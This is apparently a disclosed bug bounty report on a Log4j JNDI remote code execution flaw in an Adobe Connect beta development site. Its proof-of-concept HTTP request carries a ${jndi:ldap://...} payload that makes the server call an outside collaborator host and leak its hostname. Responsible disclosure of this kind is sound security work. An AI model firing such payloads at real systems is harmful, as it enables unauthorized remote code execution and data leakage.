# Log4j Java RCE in [beta.dev.adobeconnect.com]

## Report Details
- **Report ID**: 1442644
- **URL**: https://hackerone.com/reports/1442644
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-01-06T13:52:00.220Z
- **Disclosed**: 2022-03-21T16:26:11.645Z

## Reporter
- **Username**: sheikhrishad0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: adobe

## Vulnerability Information
Hello Security Team,

###Summary
Log4j versions prior to 2.15.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.
As per Apache's Log4j security guide: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.

###Platform Affected: [website]
https://beta.dev.adobeconnect.com

###Proof of concept:

* Request:

```javascript
GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1
Host: beta.dev.adobeconnect.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

* Response:

{F1569913}

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.

Regards,
Sheikh rishad

## Attachments
- PoC.jpeg
